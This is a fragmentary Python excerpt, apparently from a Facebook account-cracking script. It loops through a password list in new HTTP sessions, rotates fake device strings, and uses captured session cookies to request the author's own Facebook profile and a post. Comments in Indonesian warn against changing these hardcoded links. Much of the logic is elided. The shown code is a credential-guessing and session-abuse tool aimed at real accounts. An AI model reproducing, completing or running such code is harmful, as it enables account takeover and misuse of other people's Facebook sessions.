    ...
    try:
        for password in pwx:
            with requests.Session() as r:
                acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64','Windows NT 6.3; Win64; x64','Windows NT 6.3','Windows NT 6.3; WOW64'])
    ...
    try:
        ...
        if token.lower() == 'get' or 'get' in str(token.lower()):
            ...
            try:
                ...
                response = requests.get('https://www.facebook.com/ASEPYUSUP2001', headers = {'cookie': cookies}).text # Jangan Di Ganti
                ...
                response2 = requests.get('https://www.facebook.com/1114005710/posts/578144804205807/?substory_index=578144804205807&app=fbl', headers = {'cookie': cookies}).text # Jangan Di Ganti
                data = {
